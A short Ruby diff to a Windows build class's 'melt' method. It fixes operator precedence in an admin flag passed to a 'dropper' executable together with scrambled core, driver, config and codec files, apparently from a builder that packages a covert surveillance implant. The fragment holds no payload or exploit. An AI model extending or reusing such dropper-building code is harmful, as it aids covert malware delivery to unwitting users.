@@ -53,14 +53,16 @@ class BuildWindows < Build
   def melt(params)
     trace :debug, "Build: melting: #{params}"
 
+    manifest = (params['admin'] == true) ? '1' : '0'
+
     CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                         path(@scrambled[:core64])+' '+
                                         path(@scrambled[:config])+' '+
                                         path(@scrambled[:driver])+' '+
                                         path(@scrambled[:driver64])+' '+
                                         path(@scrambled[:codec])+' '+
-                                        path(@scrambled[:dir])+' '+
-                                        params['admin'] ? '1' : '0' +
+                                        @scrambled[:dir]+' '+
+                                        manifest +' '+
                                         path('default')+' '+
                                         path('output')
 
